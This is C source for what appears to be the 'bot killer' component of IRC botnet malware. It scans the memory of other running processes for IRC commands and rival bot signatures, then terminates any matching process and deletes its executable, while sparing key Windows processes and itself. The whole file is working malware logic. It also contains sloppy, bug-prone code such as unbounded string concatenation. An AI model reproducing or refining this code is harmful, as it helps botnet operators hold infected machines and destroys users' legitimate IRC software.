#include "wALL.h" 

void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ); 
void KillBot( PROCESSENTRY32 pe32 ); 

struct s_Search 
{ 
   char* szBot; 
   char* szString; 
}; 

s_Search sSearch[ ] = 
{ 
   { "Unknown", "JOIN" },
   { "Unknown", "PART" },
   { "Unknown", "NICK" },
   { "Unknown", "PRIVMSG" },
   { "Skidshi", "XR" },
   { "Skidshi", "Idle..." },
   { "Skidshi", "ddoser" },
   { NULL, NULL } 
}; 

void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ) 
{ 
   char szBigBuffer[ 0x5000 ] = { 0 }; 
   unsigned char Curbuf[ 0x500 ] = { 0 }; 

   HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 

//   printf( "Scanning PID: %d [ %s ]\nStart Address: 0x%08X End Address: 0x%08X\n\n", pe32.th32ProcessID, pe32.szExeFile, uStartAddr, uEndAddr ); 
    
   for( unsigned long uCurAddr = uStartAddr; uCurAddr <= uEndAddr; uCurAddr++ ) 
   { 
      BOOL bRead = ReadProcessMemory( hProcess, (void *)uCurAddr, (void *)&Curbuf, sizeof( Curbuf ), NULL ); 
       
      if( bRead ) 
      { 
         int c = 0; 

         strcat( szBigBuffer, (char *)Curbuf );          

         while( sSearch[ c ].szString != NULL ) 
         { 
            if( strstr( szBigBuffer, sSearch[ c ].szString ) ) 
            { 
         //      printf( "Found string \"%s\" in \"%s\" server \"%s\"\n\n", sSearch[ c ].szString, pe32.szExeFile, sSearch[ c ].szBot ); 
               KillBot( pe32 );                
            } 

            c++; 
         } 

         if( sizeof( szBigBuffer ) > 0x150 ) 
            ZeroMemory( szBigBuffer, sizeof( szBigBuffer ) ); 
      } 
       
      if( !bRead ) 
         break; 
   } 

   CloseHandle( hProcess ); 
}; 

void KillBot( PROCESSENTRY32 pe32 ) 
{ 
   MODULEENTRY32 me32 = { 0 }; 
   HANDLE hPath = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe32.th32ProcessID ); 
   HANDLE hKillProcess; 

   me32.dwSize = sizeof( me32 ); 

   BOOL bRetval = Module32First( hPath, &me32 ); 
    
   while( bRetval ) 
   { 
      if( !strcmp( pe32.szExeFile, me32.szModule ) ) 
      { 
         SetFileAttributes( me32.szExePath, FILE_ATTRIBUTE_NORMAL ); 

         hKillProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
         TerminateProcess( hKillProcess, 0 ); 

         Sleep( 500 ); 

         DeleteFile( me32.szExePath );
	  }
      bRetval = Module32Next( hPath, &me32 ); 
   }    

   CloseHandle( hKillProcess ); 
   CloseHandle( hPath ); 
}; 

int BotKill( ) 
{ 
   char szFile[ 128 ]; 
   GetModuleFileName( GetModuleHandle( NULL ), szFile, sizeof( szFile ) ); 

   char* szBlockList[ ] = { "explorer.exe", "hidserv.exe", "WINLOGON.EXE", "SERVICES.EXE", szFile };       
   HANDLE hProcess = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ); 
   PROCESSENTRY32 pe32; 

   pe32.dwSize = sizeof( PROCESSENTRY32 ); 

   BOOL bRetval = Process32First( hProcess, &pe32 ); 
   bool bDoSearch = true; 

   while( bRetval ) 
   { 
      Sleep( 250 ); 

      for( int i = 0; i < ( sizeof( szBlockList ) / sizeof( char* ) ); i++ ) 
      { 
         if( strstr( szBlockList[ i ], pe32.szExeFile ) ) 
            bDoSearch = false; 
      } 

      if( bDoSearch ) 
      { 
         DoSearch( 0x00400000, 0x004FFFFF, pe32 ); 
         DoSearch( 0x00100000 ,0x001FFFFF, pe32 ); 
      } 
       
      else 
         bDoSearch = true; 

      bRetval = Process32Next( hProcess, &pe32 ); 
   } 

   CloseHandle( hProcess ); 

 //  printf( "Done scanning, press ENTER to exit this program.\n" ); 

   getchar( ); 

   return 0; 
};